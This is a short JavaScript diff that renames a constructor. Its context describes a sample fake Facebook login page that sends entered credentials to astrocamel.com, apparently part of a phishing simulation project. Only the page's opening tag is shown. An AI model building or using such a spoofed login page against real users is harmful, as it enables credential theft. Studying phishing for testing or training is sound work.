@@ -14,7 +14,7 @@ function hereDoc(str) {
 }
 
 // A webpage object
-function webpage(url, src) {
+function Webpage(url, src) {
     this.url = url;
     this.getSource = hereDoc(src);
 }
@@ -23,7 +23,7 @@ function webpage(url, src) {
 * A sample webpage which simulates the Facebook login page
 * but insteads sends the credentials to astrocamel.com
 */
-var facebook_fake_page = new webpage("http://www.facebook.com",
+var facebook_fake_page = new Webpage("http://www.facebook.com",
 					function() {/*!
 <!DOCTYPE html>
 <html id="facebook" class="tinyViewport" lang="en">
